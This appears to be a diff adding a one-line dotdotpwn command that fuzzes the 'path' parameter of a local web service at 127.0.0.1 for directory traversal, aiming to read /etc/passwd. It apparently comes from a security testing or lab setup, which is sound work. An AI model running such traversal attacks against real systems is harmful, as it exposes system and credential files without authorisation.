@@ -1,0 +1,5 @@
+# dotdotpwn
+#
+
+# Directory traversal for url http://127.0.0.1:65412/ at variable 'path' looking for /etc/passwd (root:)
+./dotdotpwn.pl -m http-url -u 'http://127.0.0.1:65412/?path=TRAVERSAL' -o 'unix' -k 'root:'
